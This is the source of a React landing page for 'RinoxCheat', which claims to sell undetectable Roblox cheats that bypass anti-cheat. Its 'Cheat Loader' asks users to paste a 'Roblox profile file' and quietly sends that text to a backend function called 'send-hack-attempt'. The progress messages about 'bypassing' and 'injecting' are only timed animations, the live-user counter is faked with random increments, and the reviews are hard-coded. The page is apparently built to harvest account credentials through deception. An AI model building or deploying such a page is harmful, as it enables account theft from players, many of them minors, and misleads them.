import { useEffect, useRef, useState } from "react";
import CursorTrail from "@/components/CursorTrail";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import {
  ShieldCheck,
  Zap,
  CheckCircle2,
  Play,
  Gamepad2,
  Crosshair,
  Eye,
  Wind,
  Activity,
  ChevronDown,
  Star,
} from "lucide-react";

type Language = "fr" | "en";

const TRANSLATIONS = {
  fr: {
    versionBadge: "2026 Edition · v3.0 lancé",
    hero_title: "Cheats Roblox Premium.",
    hero_highlight: "Indétectable. Instantané.",
    hero_desc: "Le toolkit de cheats Roblox le plus avancé en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Rapide, propre, indétectable.",
    getCheats: "Obtenir les cheats",
    watchTutorial: "Voir le tutoriel",
    undetected: "Indétectable",
    instantDelivery: "Livraison instantanée",
    allGames: "Tous les jeux Roblox",
    features: "Cheats",
    get: "Obtenir",
    tutorial: "Tutoriel",
    online: "En ligne",
    aimbotTitle: "Aimbot",
    aimbotDesc: "Lock-on précis, smoothing réglable, FOV personnalisable pour tous les Roblox shooters.",
    espTitle: "ESP & Wallhack",
    espDesc: "Voir les joueurs, items et objectifs à travers les murs — distance, HP, équipe.",
    flyTitle: "Fly, Speed & No-Clip",
    flyDesc: "Mouvement total — vol, vitesse boostée et traversée des collisions.",
    undetectedTitle: "Indétectable",
    undetectedDesc: "Bypass Byfron & Hyperion mis à jour en continu pour une session safe.",
    cheatLoaderTitle: "Cheat Loader",
    secureSession: "Session sécurisée",
    robloxSupported: "Supporté",
    profileLabel: "Indique ton profil Roblox comme sur la vidéo pour recevoir les cheats.",
    profilePlaceholder: "Fichier de profil Roblox...",
    deliveryNote: "Les cheats sont livrés directement à ton compte.",
    injectButton: "Injecter les cheats",
    loading: "Chargement...",
    cheatsInjected: "Cheats injectés",
    launchRoblox: "Lance Roblox — tes cheats seront actifs sous 2–3 minutes.",
    tutorialTitle: "Comment ça marche",
    tutorialDesc: "2 minutes pour tout comprendre avant de lancer tes cheats.",
    videoNotDisplaying: "Si la vidéo ne s'affiche pas ici, ",
    openYoutube: "ouvrez-la sur YouTube",
    copyright: "RinoxCheat © 2026",
    privateNote: "Outil privé · À utiliser à vos risques et périls",
    faqTitle: "Questions Fréquemment Posées",
    faqDesc: "Trouve les réponses à tes questions les plus courantes",
    reviewsTitle: "Avis Clients",
    reviewsDesc: "Ce que disent nos utilisateurs satisfaits",
    missingInfo: "Info manquante",
    errorMsg: "Veuillez remplir le champ du profil",
    connecting: "Connexion au serveur Roblox...",
    loading2: "Chargement des modules...",
    bypassing: "Contournement de Byfron / Hyperion...",
    injecting: "Injection des scripts...",
  },
  en: {
    versionBadge: "2026 Edition · v3.0 shipped",
    hero_title: "Premium Roblox cheats.",
    hero_highlight: "Undetected. Instant.",
    hero_desc: "The most advanced Roblox cheat toolkit in 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Fast, clean, undetectable.",
    getCheats: "Get the cheats",
    watchTutorial: "Watch tutorial",
    undetected: "Undetected",
    instantDelivery: "Instant delivery",
    allGames: "All Roblox games",
    features: "Cheats",
    get: "Get",
    tutorial: "Tutorial",
    online: "Online",
    aimbotTitle: "Aimbot",
    aimbotDesc: "Precise lock-on, adjustable smoothing, customizable FOV for all Roblox shooters.",
    espTitle: "ESP & Wallhack",
    espDesc: "See players, items and objectives through walls — distance, HP, team.",
    flyTitle: "Fly, Speed & No-Clip",
    flyDesc: "Total movement — flight, boosted speed and collision traversal.",
    undetectedTitle: "Undetected",
    undetectedDesc: "Bypass Byfron & Hyperion continuously updated for safe sessions.",
    cheatLoaderTitle: "Cheat Loader",
    secureSession: "Secure session",
    robloxSupported: "Supported",
    profileLabel: "Enter your Roblox profile as shown in the video to receive cheats.",
    profilePlaceholder: "Roblox Profile File...",
    deliveryNote: "Cheats are delivered directly to your account.",
    injectButton: "Inject cheats",
    loading: "Loading...",
    cheatsInjected: "Cheats Injected",
    launchRoblox: "Launch Roblox — your cheats will be active within 2–3 minutes.",
    tutorialTitle: "How it works",
    tutorialDesc: "2 minutes to understand everything before launching your cheats.",
    videoNotDisplaying: "If the video doesn't display here, ",
    openYoutube: "open it on YouTube",
    copyright: "RinoxCheat © 2026",
    privateNote: "Private tool · Use at your own risk",
    faqTitle: "Frequently Asked Questions",
    faqDesc: "Find answers to your most common questions",
    reviewsTitle: "Customer Reviews",
    reviewsDesc: "What our satisfied users are saying",
    missingInfo: "Missing info",
    errorMsg: "Please fill in the profile field",
    connecting: "Connecting to Roblox server...",
    loading2: "Loading cheat modules...",
    bypassing: "Bypassing Byfron / Hyperion...",
    injecting: "Injecting scripts...",
  },
};

const STEPS_FR = [
  "Connexion au serveur Roblox...",
  "Chargement des modules...",
  "Contournement de Byfron / Hyperion...",
  "Injection des scripts...",
];

const STEPS_EN = [
  "Connecting to Roblox server...",
  "Loading cheat modules...",
  "Bypassing Byfron / Hyperion...",
  "Injecting scripts...",
];

const Index = () => {
  const [language, setLanguage] = useState<Language>("fr");
  const [target, setTarget] = useState("");
  const [loading, setLoading] = useState(false);
  const [steps, setSteps] = useState<string[]>([]);
  const [done, setDone] = useState(false);
  const [expandedFaq, setExpandedFaq] = useState<number | null>(null);
  const [typedTitle, setTypedTitle] = useState("");
  const [typedHighlight, setTypedHighlight] = useState("");
  const [usersOnline, setUsersOnline] = useState(12847);
  const [reviewIndex, setReviewIndex] = useState(0);
  const orb1Ref = useRef<HTMLDivElement>(null);
  const orb2Ref = useRef<HTMLDivElement>(null);
  const orb3Ref = useRef<HTMLDivElement>(null);

  const t = TRANSLATIONS[language];
  const STEPS = language === "fr" ? STEPS_FR : STEPS_EN;

  const FEATURES = [
    {
      icon: Crosshair,
      title: t.aimbotTitle,
      desc: t.aimbotDesc,
    },
    {
      icon: Eye,
      title: t.espTitle,
      desc: t.espDesc,
    },
    {
      icon: Wind,
      title: t.flyTitle,
      desc: t.flyDesc,
    },
    {
      icon: ShieldCheck,
      title: t.undetectedTitle,
      desc: t.undetectedDesc,
    },
  ];

  const FAQs = language === "fr" ? [
    {
      q: "Comment fonctionne le bypass Byfron ?",
      a: "Notre système utilise des techniques avancées de détection d'anti-cheat pour contourner Byfron en temps réel.",
    },
    {
      q: "Est-ce vraiment indétectable ?",
      a: "Oui, nos cheats sont mis à jour continuellement pour éviter les détections. Nous offrons une protection maximale.",
    },
    {
      q: "Combien de temps pour recevoir les cheats ?",
      a: "Les cheats sont livrés instantanément après injection. Ils seront actifs en 2-3 minutes.",
    },
    {
      q: "Fonctionne sur tous les jeux Roblox ?",
      a: "Oui, notre toolkit fonctionne sur pratiquement tous les jeux Roblox populaires.",
    },
  ] : [
    {
      q: "How does the Byfron bypass work?",
      a: "Our system uses advanced anti-cheat detection techniques to bypass Byfron in real-time.",
    },
    {
      q: "Is it really undetectable?",
      a: "Yes, our cheats are continuously updated to avoid detection. We provide maximum protection.",
    },
    {
      q: "How long to receive the cheats?",
      a: "Cheats are delivered instantly after injection. They will be active within 2-3 minutes.",
    },
    {
      q: "Does it work on all Roblox games?",
      a: "Yes, our toolkit works on virtually all popular Roblox games.",
    },
  ];

  const REVIEWS = language === "fr" ? [
    {
      name: "Zeyn00",
      game: "Rivals",
      rating: 5,
      text: "Les cheats marchent parfaitement ! Aucune détection en 2 mois.",
    },
    {
      name: "Sushi_tm",
      game: "Steal a brainrot",
      rating: 5,
      text: "Incroyable ! le fly est très smooth et le instant steal est ultra utile.",
    },
    {
      name: "PAN23",
      game: "Grow A Garden 2",
      rating: 5,
      text: "Livraison instantanée, interface simple, marche grv bien !",
    },
    {
      name: "Emmzzz",
      game: "Doors",
      rating: 5,
      text: "Meilleur investissement jamais fait. Support réactif aussi !",
    },
  ] : [
    {
      name: "Zeyn00",
      game: "Rivals",
      rating: 5,
      text: "Cheats work perfectly! No detection for 2 months.",
    },
    {
      name: "Sushi_tm",
      game: "Steal a brainrot",
      rating: 5,
      text: "Incredible! The aimbot is very smooth and the ESP is ultra useful.",
    },
    {
      name: "PAN23",
      game: "Grow A Garden 2",
      rating: 5,
      text: "Instant delivery, simple interface, works great!",
    },
    {
      name: "Emmzzz",
      game: "Doors",
      rating: 5,
      text: "Best investment ever. Responsive support too!",
    },
  ];

  useEffect(() => {
    document.title = language === "fr" ? "RinoxCheat — Cheats Roblox Premium 2026" : "RinoxCheat — Premium Roblox Cheats 2026";
    const desc = language === "fr" 
      ? "RinoxCheat: les meilleurs cheats Roblox indétectables en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion."
      : "RinoxCheat: The best undetectable Roblox cheats in 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion.";
    let m = document.querySelector('meta[name="description"]');
    if (!m) {
      m = document.createElement("meta");
      m.setAttribute("name", "description");
      document.head.appendChild(m);
    }
    m.setAttribute("content", desc);
  }, [language]);

  // Typing effect on hero title
  useEffect(() => {
    setTypedTitle("");
    setTypedHighlight("");
    const full1 = t.hero_title;
    const full2 = t.hero_highlight;
    let i = 0;
    const timers: number[] = [];
    const typeTitle = () => {
      if (i <= full1.length) {
        setTypedTitle(full1.slice(0, i));
        i++;
        timers.push(window.setTimeout(typeTitle, 45));
      } else {
        let j = 0;
        const typeHighlight = () => {
          if (j <= full2.length) {
            setTypedHighlight(full2.slice(0, j));
            j++;
            timers.push(window.setTimeout(typeHighlight, 55));
          }
        };
        typeHighlight();
      }
    };
    typeTitle();
    return () => timers.forEach(clearTimeout);
  }, [language, t.hero_title, t.hero_highlight]);

  // Live users online counter
  useEffect(() => {
    const id = window.setInterval(() => {
      setUsersOnline((u) => u + Math.floor(Math.random() * 5) - 1);
    }, 2200);
    return () => clearInterval(id);
  }, []);

  // Parallax orbs following mouse
  useEffect(() => {
    const onMove = (e: MouseEvent) => {
      const x = (e.clientX / window.innerWidth - 0.5) * 2;
      const y = (e.clientY / window.innerHeight - 0.5) * 2;
      if (orb1Ref.current) orb1Ref.current.style.transform = `translate(${x * 30}px, ${y * 30}px)`;
      if (orb2Ref.current) orb2Ref.current.style.transform = `translate(${x * -45}px, ${y * 25}px)`;
      if (orb3Ref.current) orb3Ref.current.style.transform = `translate(${x * 20}px, ${y * -35}px)`;
    };
    window.addEventListener("mousemove", onMove);
    return () => window.removeEventListener("mousemove", onMove);
  }, []);

  // Auto-rotating reviews carousel
  useEffect(() => {
    const id = window.setInterval(() => {
      setReviewIndex((i) => i + 1);
    }, 4000);
    return () => clearInterval(id);
  }, []);

  const handleHack = async (e?: React.MouseEvent<HTMLButtonElement>) => {
    // Ripple effect
    if (e) {
      const btn = e.currentTarget;
      const rect = btn.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      const ripple = document.createElement("span");
      ripple.className = "ripple-span";
      ripple.style.width = ripple.style.height = `${size}px`;
      ripple.style.left = `${e.clientX - rect.left - size / 2}px`;
      ripple.style.top = `${e.clientY - rect.top - size / 2}px`;
      btn.appendChild(ripple);
      setTimeout(() => ripple.remove(), 650);
    }

    if (!target.trim()) {
      toast({
        title: t.missingInfo,
        description: t.errorMsg,
        variant: "destructive",
      });
      return;
    }
    setLoading(true);
    setDone(false);
    setSteps([]);

    const payload = `Game: Roblox\nUser: ${target}`;
    const sendPromise = supabase.functions.invoke("send-hack-attempt", {
      body: { input: payload },
    });

    for (let i = 0; i < STEPS.length; i++) {
      await new Promise((r) => setTimeout(r, 550 + Math.random() * 350));
      setSteps((prev) => [...prev, STEPS[i]]);
    }

    await new Promise((r) => setTimeout(r, 600));
    await sendPromise;

    setLoading(false);
    setDone(true);
    setTarget("");
  };

  return (
    <div className="relative min-h-screen">
      <CursorTrail />
      {/* Background layers */}
      <div aria-hidden className="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
        <div className="absolute inset-0 grid-bg opacity-50" />
        <div
          className="absolute inset-0"
          style={{ background: "var(--gradient-radial)" }}
        />
        {/* Floating orbs (parallax) */}
        <div ref={orb1Ref} className="orb orb-1" />
        <div ref={orb2Ref} className="orb orb-2" />
        <div ref={orb3Ref} className="orb orb-3" />
        {/* Drifting particles */}
        <div className="particles">
          {Array.from({ length: 14 }).map((_, i) => (
            <span
              key={i}
              className="particle"
              style={{
                left: `${(i * 73) % 100}%`,
                animationDelay: `${(i * 1.7) % 12}s`,
                animationDuration: `${14 + (i % 6) * 3}s`,
              }}
            />
          ))}
        </div>
      </div>

      {/* Nav */}
      <header className="sticky top-0 z-30 backdrop-blur-md bg-background/70 border-b border-border/60">
        <div className="max-w-6xl mx-auto px-5 sm:px-8 h-14 flex items-center justify-between">
          <div className="flex items-center gap-2 group logo-glitch cursor-pointer">
            <div className="h-7 w-7 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] bg-[length:200%_200%] animate-gradient-pan flex items-center justify-center transition-transform duration-300 group-hover:scale-110">
              <Crosshair className="h-4 w-4 text-primary-foreground" />
            </div>
            <span className="font-semibold tracking-tight logo-glitch-text">RinoxCheat</span>
          </div>
          <div className="hidden sm:flex items-center gap-6 text-sm text-muted-foreground">
            <a href="#features" className="hover:text-foreground transition-colors hover:scale-105 inline-block">{t.features}</a>
            <a href="#tool" className="hover:text-foreground transition-colors hover:scale-105 inline-block">{t.get}</a>
            <a href="#tutorial" className="hover:text-foreground transition-colors hover:scale-105 inline-block">{t.tutorial}</a>
          </div>
          <div className="flex items-center gap-4">
            {/* Language Selector */}
            <div className="flex items-center gap-2 bg-secondary/40 rounded-full p-1 border border-border/40">
              <button
                onClick={() => setLanguage("fr")}
                className={`px-3 py-1 rounded-full text-sm font-medium transition-all transform ${
                  language === "fr"
                    ? "bg-primary text-primary-foreground scale-105"
                    : "text-muted-foreground hover:text-foreground hover:scale-105"
                }`}
              >
                🇫🇷 FR
              </button>
              <button
                onClick={() => setLanguage("en")}
                className={`px-3 py-1 rounded-full text-sm font-medium transition-all transform ${
                  language === "en"
                    ? "bg-primary text-primary-foreground scale-105"
                    : "text-muted-foreground hover:text-foreground hover:scale-105"
                }`}
              >
                🇺🇸 EN
              </button>
            </div>
            <div className="hidden md:flex items-center gap-2 text-xs text-muted-foreground">
              <span className="h-2 w-2 rounded-full bg-primary live-dot" />
              <span className="tabular-nums">{usersOnline.toLocaleString()} {t.online}</span>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-5 sm:px-8 pb-20">
        {/* Hero */}
        <section className="pt-16 sm:pt-24 pb-12 text-center max-w-3xl mx-auto">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-6 animate-fade-in hover:scale-105 transition-transform duration-300">
            <Activity className="h-3.5 w-3.5 text-primary" />
            <span>{t.versionBadge}</span>
          </div>
          <h1
            className="text-4xl sm:text-6xl font-semibold tracking-tight leading-[1.05] mb-5 animate-fade-in"
            style={{ animationDelay: "80ms" }}
          >
            <span className={typedTitle.length < t.hero_title.length ? "typing-caret" : ""}>{typedTitle}</span>
            <br className="hidden sm:block" />
            <span className="text-gradient bg-[length:200%_auto] animate-gradient-pan">
              <span className={typedTitle.length >= t.hero_title.length && typedHighlight.length < t.hero_highlight.length ? "typing-caret" : ""}>{typedHighlight}</span>
            </span>
          </h1>
          <p
            className="text-muted-foreground text-base sm:text-lg leading-relaxed max-w-xl mx-auto animate-fade-in hover:text-foreground transition-colors duration-300"
            style={{ animationDelay: "160ms" }}
          >
            {t.hero_desc}
          </p>
          <div
            className="mt-8 flex items-center justify-center gap-3 animate-fade-in"
            style={{ animationDelay: "240ms" }}
          >
            <a href="#tool">
              <Button className="h-11 px-6 rounded-full font-medium shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] hover:scale-110 hover:shadow-[0_12px_40px_-8px_hsl(var(--primary)/0.8)] transition-all duration-300 animate-bounce-in">
                {t.getCheats}
              </Button>
            </a>
            <a href="#tutorial">
              <Button
                variant="secondary"
                className="h-11 px-6 rounded-full font-medium hover:scale-110 transition-all duration-300"
              >
                <Play className="h-4 w-4 mr-1.5" /> {t.watchTutorial}
              </Button>
            </a>
          </div>

          <div
            className="mt-10 flex flex-wrap items-center justify-center gap-x-8 gap-y-3 text-xs text-muted-foreground animate-fade-in"
            style={{ animationDelay: "320ms" }}
          >
            <span className="flex items-center gap-1.5 hover:text-primary transition-colors duration-300 transform hover:scale-110">
              <ShieldCheck className="h-3.5 w-3.5 text-primary" /> {t.undetected}
            </span>
            <span className="flex items-center gap-1.5 hover:text-primary transition-colors duration-300 transform hover:scale-110">
              <Zap className="h-3.5 w-3.5 text-primary" /> {t.instantDelivery}
            </span>
            <span className="flex items-center gap-1.5 hover:text-primary transition-colors duration-300 transform hover:scale-110">
              <Gamepad2 className="h-3.5 w-3.5 text-primary" /> {t.allGames}
            </span>
          </div>
        </section>

        {/* Features */}
        <section
          id="features"
          className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-16"
          aria-label="Cheats"
        >
          {FEATURES.map((f, i) => (
            <div
              key={f.title}
              className="group rounded-2xl border border-border bg-card/60 backdrop-blur p-5 hover:border-primary/40 hover:-translate-y-2 hover:shadow-[0_20px_40px_-20px_hsl(var(--primary)/0.4)] transition-all duration-300 animate-fade-in transform hover:scale-105 cursor-pointer tilt-hover"
              style={{ animationDelay: `${i * 100}ms` }}
            >
              <div className="h-9 w-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center mb-4 transition-all duration-300 group-hover:scale-125 group-hover:rotate-12 group-hover:bg-primary/20 group-hover:icon-glow">
                <f.icon className="h-4 w-4 text-primary" />
              </div>
              <h3 className="font-medium mb-1 group-hover:text-primary transition-colors">{f.title}</h3>
              <p className="text-sm text-muted-foreground leading-relaxed group-hover:text-foreground/80 transition-colors">
                {f.desc}
              </p>
            </div>
          ))}
        </section>

        {/* Tool */}
        <section
          id="tool"
          aria-label="Cheat panel"
          className="max-w-md mx-auto"
        >
          <div className="rounded-2xl border border-border bg-card/80 backdrop-blur shadow-[var(--shadow-card)] overflow-hidden animate-scale-in hover:shadow-[0_20px_60px_-20px_hsl(var(--primary)/0.4)] transition-all duration-300">
            <div className="flex items-center justify-between px-5 py-3 border-b border-border bg-secondary/40">
              <div className="flex items-center gap-2 text-sm font-medium">
                <Crosshair className="h-4 w-4 text-primary animate-spin-slow" />
                {t.cheatLoaderTitle}
              </div>
              <span className="text-[10px] tracking-widest text-muted-foreground uppercase">
                {t.secureSession}
              </span>
            </div>

            <div className="p-5 sm:p-6">
              <div className="flex items-center justify-between mb-4 p-3 rounded-lg bg-input border border-border hover:border-primary/40 transition-all duration-300 transform hover:scale-105">
                <div className="flex items-center gap-2.5">
                  <Gamepad2 className="h-4 w-4 text-primary" />
                  <span className="text-sm font-medium">Roblox</span>
                </div>
                <span className="text-[10px] tracking-widest text-primary uppercase">
                  {t.robloxSupported}
                </span>
              </div>

              <label htmlFor="target" className="block text-sm font-medium mt-1 mb-2">
                {t.profileLabel}
              </label>
              <Input
                id="target"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                disabled={loading}
                placeholder={t.profilePlaceholder}
                maxLength={5000}
                className="h-11 rounded-lg bg-input border-border focus-visible:ring-primary hover:border-primary/40 transition-all duration-300"
              />
              <p className="text-xs text-muted-foreground mt-2">
                {t.deliveryNote}
              </p>

              <Button
                onClick={handleHack}
                disabled={loading}
                className="ripple-btn w-full mt-5 h-12 rounded-lg font-medium text-base shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] disabled:opacity-80 disabled:hover:scale-100 hover:scale-105 hover:shadow-[0_12px_40px_-8px_hsl(var(--primary)/0.8)] transition-all duration-300 transform"
              >
                {loading ? (
                  <span className="flex items-center gap-2">
                    <span className="h-4 w-4 rounded-full border-2 border-primary-foreground/40 border-t-primary-foreground animate-spin" />
                    {t.loading}
                  </span>
                ) : (
                  t.injectButton
                )}
              </Button>

              {(steps.length > 0 || done) && (
                <div className="mt-6 space-y-2">
                  {steps.map((s, i) => (
                    <div
                      key={i}
                      className="animate-slide-in-right flex items-center gap-2 text-sm text-muted-foreground hover:text-primary transition-colors duration-300"
                      style={{ animationDelay: `${i * 60}ms` }}
                    >
                      <CheckCircle2 className="h-4 w-4 text-primary shrink-0 animate-bounce-in" />
                      <span>{s}</span>
                    </div>
                  ))}
                  {done && (
                    <div className="animate-scale-in mt-4 p-4 rounded-lg bg-primary/10 border border-primary/30 hover:bg-primary/20 hover:shadow-[0_0_20px_hsl(var(--primary)/0.3)] transition-all duration-300">
                      <div className="flex items-center gap-2 font-medium text-primary mb-1">
                        <CheckCircle2 className="h-4 w-4 animate-pulse-brightness" />
                        {t.cheatsInjected}
                      </div>
                      <p className="text-sm text-foreground/80">
                        {t.launchRoblox}
                      </p>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        </section>

        {/* Tutorial */}
        <section
          id="tutorial"
          aria-label="Tutorial video"
          className="max-w-3xl mx-auto mt-20"
        >
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-4 hover:scale-105 transition-transform duration-300">
              <Play className="h-3.5 w-3.5 text-primary" />
              <span>{t.tutorial}</span>
            </div>
            <h2 className="text-2xl sm:text-3xl font-semibold tracking-tight hover:text-primary transition-colors duration-300">
              {t.tutorialTitle}
            </h2>
            <p className="text-sm text-muted-foreground mt-2 hover:text-foreground transition-colors duration-300">
              {t.tutorialDesc}
            </p>
          </div>
          <div className="relative aspect-video w-full rounded-2xl overflow-hidden border border-border bg-card glow-ring hover:shadow-[0_0_40px_hsl(var(--primary)/0.3)] transition-all duration-300 transform hover:scale-105">
            <iframe
              className="absolute inset-0 w-full h-full"
              src="https://www.youtube-nocookie.com/embed/hXn2q5PHNGs"
              title="Tutorial — RinoxCheat"
              loading="lazy"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
              referrerPolicy="strict-origin-when-cross-origin"
              allowFullScreen
            ></iframe>
          </div>
          <p className="mt-2 text-center text-xs text-muted-foreground">
            {t.videoNotDisplaying}<a className="underline hover:text-primary transition-colors" href="https://youtu.be/tLsw-blhUAI" target="_blank" rel="noopener noreferrer">{t.openYoutube}</a>.
          </p>
        </section>

        {/* Reviews */}
        <section className="max-w-4xl mx-auto mt-24">
          <div className="text-center mb-10">
            <h2 className="text-3xl font-semibold tracking-tight mb-2 hover:text-primary transition-colors duration-300">
              {t.reviewsTitle}
            </h2>
            <p className="text-muted-foreground hover:text-foreground transition-colors duration-300">
              {t.reviewsDesc}
            </p>
          </div>
          <div className="relative overflow-hidden">
            <div
              className="flex transition-transform duration-700 ease-out"
              style={{ transform: `translateX(-${(reviewIndex % REVIEWS.length) * 100}%)` }}
            >
              {REVIEWS.map((review, i) => (
                <div key={i} className="w-full shrink-0 px-2">
                  <div className="rounded-2xl border border-border bg-card/60 backdrop-blur p-8 max-w-xl mx-auto hover:border-primary/40 transition-all duration-300">
                    <div className="flex items-center gap-3 mb-4">
                      <div className="w-12 h-12 rounded-full bg-primary/20 flex items-center justify-center font-semibold text-primary text-lg">
                        {review.name[0]}
                      </div>
                      <div>
                        <div className="font-medium">{review.name}</div>
                        <div className="text-xs text-muted-foreground">{review.game}</div>
                      </div>
                    </div>
                    <div className="flex gap-1 mb-3">
                      {Array.from({ length: review.rating }).map((_, j) => (
                        <Star key={j} className="h-4 w-4 fill-primary text-primary" />
                      ))}
                    </div>
                    <p className="text-base text-muted-foreground leading-relaxed">
                      "{review.text}"
                    </p>
                  </div>
                </div>
              ))}
            </div>
            <div className="flex justify-center gap-2 mt-6">
              {REVIEWS.map((_, i) => (
                <button
                  key={i}
                  onClick={() => setReviewIndex(i)}
                  aria-label={`Review ${i + 1}`}
                  className={`h-2 rounded-full transition-all duration-300 ${
                    i === reviewIndex % REVIEWS.length
                      ? "w-8 bg-primary"
                      : "w-2 bg-muted-foreground/30 hover:bg-muted-foreground/60"
                  }`}
                />
              ))}
            </div>
          </div>
        </section>

        {/* FAQ */}
        <section className="max-w-2xl mx-auto mt-24">
          <div className="text-center mb-10">
            <h2 className="text-3xl font-semibold tracking-tight mb-2 hover:text-primary transition-colors duration-300">
              {t.faqTitle}
            </h2>
            <p className="text-muted-foreground hover:text-foreground transition-colors duration-300">
              {t.faqDesc}
            </p>
          </div>
          <div className="space-y-3">
            {FAQs.map((faq, i) => (
              <div
                key={i}
                className="rounded-xl border border-border bg-card/60 backdrop-blur overflow-hidden hover:border-primary/40 transition-all duration-300 animate-fade-in"
                style={{ animationDelay: `${i * 50}ms` }}
              >
                <button
                  onClick={() => setExpandedFaq(expandedFaq === i ? null : i)}
                  className="w-full px-6 py-4 flex items-center justify-between hover:bg-secondary/40 transition-all duration-300 text-left hover:scale-105 origin-left"
                >
                  <span className="font-medium hover:text-primary transition-colors">{faq.q}</span>
                  <ChevronDown
                    className={`h-5 w-5 text-primary transition-transform duration-300 ${
                      expandedFaq === i ? "rotate-180" : ""
                    }`}
                  />
                </button>
                {expandedFaq === i && (
                  <div className="px-6 py-4 border-t border-border bg-secondary/20 animate-float-up text-sm text-muted-foreground hover:text-foreground transition-colors">
                    {faq.a}
                  </div>
                )}
              </div>
            ))}
          </div>
        </section>
      </main>

      <footer className="border-t border-border/60 mt-24">
        <div className="max-w-6xl mx-auto px-5 sm:px-8 py-8 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-muted-foreground">
          <div className="flex items-center gap-2 hover:text-primary transition-colors duration-300">
            <div className="h-5 w-5 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] flex items-center justify-center">
              <Crosshair className="h-3 w-3 text-primary-foreground" />
            </div>
            <span>{t.copyright}</span>
          </div>
          <p className="hover:text-primary transition-colors duration-300">{t.privateNote}</p>
        </div>
      </footer>
    </div>
  );
};

export default Index;
